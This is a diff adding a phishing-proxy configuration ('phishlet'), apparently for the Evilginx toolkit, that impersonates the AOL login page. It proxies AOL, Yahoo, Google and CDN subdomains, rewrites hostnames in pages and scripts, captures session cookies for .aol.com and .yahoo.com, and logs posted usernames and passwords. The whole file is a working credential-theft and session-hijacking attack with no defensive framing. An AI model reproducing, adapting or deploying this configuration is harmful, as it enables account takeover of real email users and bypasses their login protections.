@@ -1,0 +1,70 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - { phish_sub: 'login', orig_sub: 'login', domain: 'aol.com', session: true, auto_filter: true, is_landing: true }
+  - { phish_sub: 'api.login', orig_sub: 'api.login', domain: 'aol.com', session: false, auto_filter: true, is_landing: false }
+  - { phish_sub: 'guce', orig_sub: 'guce', domain: 'aol.com', session: false, auto_filter: true, is_landing: false }
+  - { phish_sub: 'www', orig_sub: 'www', domain: 'aol.com', session: false, auto_filter: true, is_landing: false }
+  - { phish_sub: 'oidc.www', orig_sub: 'oidc.www', domain: 'aol.com', session: false, auto_filter: true, is_landing: false }
+  - { phish_sub: 'mail', orig_sub: 'mail', domain: 'aol.com', session: false, auto_filter: true, is_landing: false }
+  - { phish_sub: 'oidc.mail', orig_sub: 'oidc.mail', domain: 'aol.com', session: false, auto_filter: true, is_landing: false }
+  - { phish_sub: 'udc', orig_sub: 'udc', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false }
+  - { phish_sub: 'video-api.yql', orig_sub: 'video-api.yql', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false }
+  - { phish_sub: 'yep.video', orig_sub: 'yep.video', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false }
+  - { phish_sub: 's', orig_sub: 's', domain: 'yimg.com', session: false, auto_filter: false, is_landing: false }
+  - { phish_sub: 's', orig_sub: 's', domain: 'aolcdn.com', session: false, auto_filter: true, is_landing: false }
+  - { phish_sub: 'o', orig_sub: 'o', domain: 'aolcdn.com', session: false, auto_filter: true, is_landing: false }
+  - { phish_sub: 'api-2-0', orig_sub: 'api-2-0', domain: 'spot.im', session: false, auto_filter: true, is_landing: false }
+  - { phish_sub: 'static-cdn', orig_sub: 'static-cdn', domain: 'spot.im', session: false, auto_filter: true, is_landing: false }
+  - { phish_sub: 'launcher', orig_sub: 'launcher', domain: 'spot.im', session: false, auto_filter: true, is_landing: false }
+  - { phish_sub: 'consent.cmp', orig_sub: 'consent.cmp', domain: 'oath.com', session: false, auto_filter: true, is_landing: false }
+  - { phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, auto_filter: false, is_landing: false }
+  - { phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: true, auto_filter: true, is_landing: false }
+  - { phish_sub: 'login', orig_sub: 'login', domain: 'yahoo.net', session: false, auto_filter: false, is_landing: false }
+
+sub_filters:
+  - { triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript'] }
+  - { triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript'] }
+  - { triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript'] }
+
+  - { triggers_on: 'login.aol.com', orig_sub: 'www', domain: 'google.com', search: 'https%3A%2F%2{hostname_regexp}/', replace: 'https%3A%2F%2{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript'] }
+  - { triggers_on: 'login.aol.com', orig_sub: 'www', domain: 'google.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript'] }
+  - { triggers_on: 'login.aol.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript'] }
+  - { triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'yahoo.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript'] }
+  - { triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'yahoo.net', search: 'https%3A%2F%2{hostname_regexp}/', replace: 'https%3A%2F%2{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript'] }
+  - { triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript'] }
+  - { triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'yahoo.net', search: 'https:\u002F\u002Flogin.yahoo.net', replace: 'https:\u002F\u002Flogin.{domain}', mimes: ['text/html'] }
+
+  - { triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript'] }
+  - { triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: 'https%3A%2F%2{hostname_regexp}/', replace: 'https%3A%2F%2{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript'] }
+  - { triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript'] }
+
+auth_tokens:
+  - domain: '.aol.com'
+    keys: ['OTH', 'A1S', '.*,regexp']
+  - domain: '.login.aol.com'
+    keys: ['T', 'Y', 'AS', '.*,regexp']
+  - domain: '.www.aol.com'
+    keys: ['OTHP', '.*,regexp']
+  - domain: '.mail.aol.com'
+    keys: ['OTHP', '.*,regexp']
+  - domain: '.yahoo.com'
+    keys: ['OTHP', '.*,regexp']
+ 
+auth_urls:
+  - '/d/folders/1'
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.aol.com'
+  path: '/?src=mail&client_id=dj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--&crumb=DRDbk5t0veX&lang=en-US&redirect_uri=https%3A%2F%2Foidc.mail.aol.com%2Fcallback&pspid=972825001&activity=mail-direct&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Factivity%3Dmail-direct%26client_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--%26language%3Den-US%26nonce%3Dkvvmuf769UjtG5leQ1uJzupY9NF7NSSm%26pspid%3D972825001%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bycal-w%2Bopenid%2Bopenid2%2Bmail-w%2Bmail-x%2Bsdps-r%2Bmsgr-w%26src%3Dmail%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tL2QvZm9sZGVycy8xIn0.aJup_XFKvI3WhNVJWXvTRYaK6LSfLHxW3ozkkU-QDXznqfJ8f4gjJu3PqgENK3qw9H7cjX-9rPX28zxKAEfZVaVPBAN2LRSHsLVisk5SPlb7IREDYgDImXMuvwz1IkAP-ShkQJcekYuTdfxrrpjnUu9TWVsWLm2vqjzmdnwGvz4'
